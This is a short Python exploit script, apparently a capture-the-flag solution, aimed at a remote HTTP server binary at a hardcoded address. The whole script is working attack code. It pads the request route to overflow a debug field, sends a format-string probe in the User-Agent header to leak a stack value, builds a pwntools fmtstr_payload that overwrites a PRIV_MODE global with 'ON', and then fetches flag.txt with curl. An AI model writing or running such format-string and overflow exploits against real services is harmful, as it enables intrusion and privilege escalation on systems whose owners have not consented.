#!/usr/bin/env python3
import socket
import subprocess
from pwn import fmtstr_payload, ELF, context

# --- configuration ---
BIN_PATH = "./server"
IP      = "94.237.57.57"
PORT    = 34198
ROUTE   = b"xxxx.html" + b"A" * (33 - 4)  # overflow ctx->debug

# load binary symbols
elf = ELF(BIN_PATH, checksec=False)
context.binary = elf

def send_req_pload(route: bytes, headers: dict):
    """Helper to build and send a simple GET request with custom headers."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((IP, PORT))
        req  = b"GET " + route + b" HTTP/1.1\r\n"
        for k, v in headers.items():
            if isinstance(k, str): k = k.encode()
            if isinstance(v, str): v = v.encode()
            req += k + b": " + v + b"\r\n"
        req += b"\r\n"
        sock.sendall(req)

def stage1_find_offset():
    """
    Stage 1: probe the format‐string offset by leaking %8$p
    (we’ll read the return‐pointer or similar).
    """
    payload = b"curl"                    # skip the leading "/"
    payload += b"AAAAAAAA%8$p"           # leak out %8$p
    headers = {
        "Connection": "close",
        "User-Agent": payload
    }
    send_req_pload(ROUTE, headers)

def stage2_overwrite_privmode():
    """
    Stage 2: use fmtstr_payload to overwrite PRIV_MODE global to "ON\0\0"
    """
    target_addr = elf.sym.PRIV_MODE
    value       = b"ON\x00\x00"
    # build fmt‐string writes; 8 is the leak offset we discovered
    writes = { target_addr: value }
    base = b"curl"
    fs_payload = fmtstr_payload(8, writes, write_size="short", numbwritten=len(base))
    headers = {
        "Connection": "close",
        "User-Agent": base + fs_payload
    }
    send_req_pload(ROUTE, headers)

def main():
    stage1_find_offset()
    stage2_overwrite_privmode()
    # final step: fetch the flag
    url = f"http://{IP}:{PORT}/flag.txt"
    subprocess.run(["curl", url])

if __name__ == "__main__":
    main()
